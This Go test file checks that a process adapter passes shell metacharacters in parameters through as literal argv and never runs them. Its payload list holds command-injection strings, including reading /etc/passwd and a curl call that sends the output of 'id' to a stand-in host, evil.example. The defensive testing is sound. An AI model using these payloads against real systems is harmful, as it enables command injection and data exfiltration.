package proc

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/JimMir45/hesper/internal/actions"
	"github.com/JimMir45/hesper/internal/adapters"
	"github.com/JimMir45/hesper/internal/evidence"
)

// writeCard writes a card JSON and returns it lint-checked.
func writeCard(t *testing.T, dir, name, body string) actions.Card {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	var c actions.Card
	if err := json.Unmarshal([]byte(body), &c); err != nil {
		t.Fatal(err)
	}
	if err := c.Lint(); err != nil {
		t.Fatalf("fixture card must lint: %v", err)
	}
	return c
}

// runOne executes one card against a fake temp run dir and returns the
// result plus the emitted record(s) and the run directory.
func runOne(t *testing.T, c actions.Card, params map[string]string) (adapters.ExecResult, []evidence.Record, string) {
	t.Helper()
	runDir := t.TempDir()
	actionID := "step-1"
	work := filepath.Join(runDir, "evidence", actionID)
	p := New()
	var records []evidence.Record
	res, err := p.Execute(context.Background(),
		mkReq(c, "run-r", actionID, params, kernelTarget("localhost"), work),
		func(r evidence.Record) error {
			for i := range r.Artifacts {
				r.Artifacts[i].Path = filepath.ToSlash(filepath.Join("evidence", actionID, r.Artifacts[i].Path))
			}
			records = append(records, r)
			return nil
		})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	return res, records, runDir
}

// TestInjectionMetacharactersArriveAsLiteralArgv is the M2-4 hard-gate test:
// shell metacharacters in planner params must reach the child process as
// inert argv data. If the adapter ever routed arguments through a shell,
// these payloads would execute side effects — the marker file must stay
// absent and stdout must equal the payload byte-for-byte.
func TestInjectionMetacharactersArriveAsLiteralArgv(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "pwned-marker")
	c := writeCard(t, t.TempDir(), "inj.card.json", `{
		"version": "0.1",
		"id": "test-printf-echo",
		"title": "argv-literal probe",
		"attack": {"technique_id": "T1033"},
		"provenance": {"source_repo": "test", "commit": "abc", "license": "MIT"},
		"reuse": "embedded",
		"executor": {"adapter": "proc", "argv": ["printf", "%s", "{params.payload}"]},
		"evidence": {"must_capture": ["stdout"]}
	}`)

	payloads := []string{
		"; touch " + marker,
		"`touch " + marker + "`",
		"$(touch " + marker + ")",
		"&& echo pwned",
		"| cat /etc/passwd",
		"> " + marker,
		"&& curl http://evil.example/$(id)",
	}
	for i, payload := range payloads {
		res, records, runDir := runOne(t, c, map[string]string{"payload": payload})
		if !res.Success {
			t.Fatalf("payload %d: unexpected failure: %s", i, res.Detail)
		}
		if len(records) != 1 {
			t.Fatalf("payload %d: records = %d, want 1", i, len(records))
		}
		stdoutPath := filepath.Join(runDir, "evidence", "step-1", "stdout.txt")
		b, err := os.ReadFile(stdoutPath)
		if err != nil {
			t.Fatalf("payload %d: read stdout artifact: %v", i, err)
		}
		if string(b) != payload {
			t.Fatalf("payload %d arrived mangled:\n got  %q\n want %q", i, string(b), payload)
		}
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("injection payload executed on the host — argv discipline is broken")
	}
}
